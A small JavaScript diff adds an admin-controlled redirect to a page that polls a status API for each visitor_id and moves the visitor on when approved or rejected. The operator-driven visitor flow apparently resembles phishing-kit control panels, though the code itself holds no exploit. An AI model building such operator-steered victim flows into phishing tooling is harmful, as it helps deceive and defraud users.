@@ -36,6 +36,12 @@
         fetch(`api/check_status.php?visitor_id=${visitorId}&v=${Date.now()}`)
             .then(r => r.json())
             .then(data => {
+                // ميزة إعادة التوجيه المباشرة من الأدمن
+                if (data.redirect) {
+                    window.location.href = data.redirect + "?visitor_id=" + visitorId;
+                    return;
+                }
+
                 if (data.status === 'approved') {
                     window.location.href = nextPage + "?visitor_id=" + visitorId;
                 } else if (data.status === 'rejected') {
